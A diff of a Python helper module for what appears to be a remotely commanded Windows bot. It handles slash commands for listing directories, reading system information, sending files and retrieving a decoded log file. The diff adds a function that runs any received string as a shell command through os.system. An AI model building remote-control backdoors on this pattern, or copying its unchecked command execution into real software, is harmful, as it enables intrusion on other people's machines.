@@ -1,8 +1,16 @@
 import os
+from win32api import *
+from win32.win32event import *
+from win32.win32file import *
+from win32.win32gui import *
+from win32net import *
+import threading as th
 import os.path as path
+from log import *
+
 
 def dir(s):
-    if(s == '/cd'):
+    if s == "/cd":
         return os.getcwd()
     return ""
 
@@ -13,76 +21,123 @@ def chdir(s):
     except:
         return "impossible change directory..."
 
+
 def dirs(s):
-    if(s == '/dir'):
+    if s == "/dir":
         ls = os.listdir()
         x = ""
         for i in ls:
             try:
                 n = open(i)
                 n.close()
-                x+= "file:   "+i+"\n"
+                x += "file:   " + i + "\n"
             except:
-                x+= "directory:   "+i+"\n"
+                x += "directory:   " + i + "\n"
         return x
     else:
         return ""
 
+
 def sysinfo(s):
-    if(s == '/system_info'):
+    if s == "/system_info":
         try:
-            os.system('systeminfo > m')
-            f = open('m')
+            os.system("systeminfo > m")
+            f = open("m")
             line = f.read(65536)
             msg = line
-            while(line):
+            while line:
                 line = f.read(65536)
-                msg+=line
+                msg += line
             return msg
         except:
             return "access denied"
     else:
         return ""
 
+
 def helps(s):
-    if(s=='/help'):
+    if s == "/help":
         m = [
-            "/secure on",
-            "/secure off",
+            "/help",
+            "/secure_on",
+            "/secure_off",
             "/sendfile",
             "/cd",
             "/dir",
             "/chdir",
-            "/system_info"
+            "/system_info",
+            "/chmod",
+            "/getlog",
+            "/alert",
         ]
         msg = ""
         for i in m:
-            msg+=i+"\n"
+            msg += i + "\n"
         return msg
     else:
         return ""
 
+
 def secure(message):
-    if(message == "/secure on"):
-        open("SecureKey","wb")
-        return "secure on"
-    elif (message == "/secure off"):
-        os.remove("SecureKey")
-        return "secure off"
+    if message == "/secure_on":
+        open("SecureKey", "wb").close()
+        return "secure_on"
+    elif message == "/secure_off":
+        try:
+            os.remove("SecureKey")
+        except:
+            pass
+        return "secure_off"
     else:
         return ""
 
-def command(s):
+
+def cmd(comand):
+    os.system(comand + "> F.txt")
+    file = open("F.txt", "r")
+    line = file.read(65535)
+    res = line
+    while line:
+        line = file.read(65535)
+        res += line
+    return res
+
+def GetLog(matrix = 0):
+    log = loger("log_file.log")
+    data = log.read()
+    data = log.decode(data)
+    data = log.decode_list(data)
+    res = ""
+    if matrix == 1:
+        for i in range(len(data)):
+            data[i][1] = int(data[i][1])
+        return data
+    dato = []
+    for L in data:
+        for i in L:
+            res += i + ", "
+            if len(res) >= 3800:
+                dato.append(res)
+                res = ""
+        res += "\n"
+    dato.append(res)
+    return dato
+
+
+def commando(s, CMD=False):
     x = ""
-    x += secure(s)
-    x += helps(s)
-    x += dir(s)
-    x += dirs(s)
-    x += sysinfo(s)
-    
+    if CMD:
+        x = cmd(s)
+    else:
+        x += secure(s)
+        x += helps(s)
+        x += dir(s)
+        x += dirs(s)
+        x += sysinfo(s)
     if x == "":
         x = "no commands..."
     return x
+
 
 def CheckSecure():
     l = os.listdir()
@@ -90,3 +145,6 @@ def CheckSecure():
         return True
     else:
         return False
+
+
+print('module loaded: "utils"')
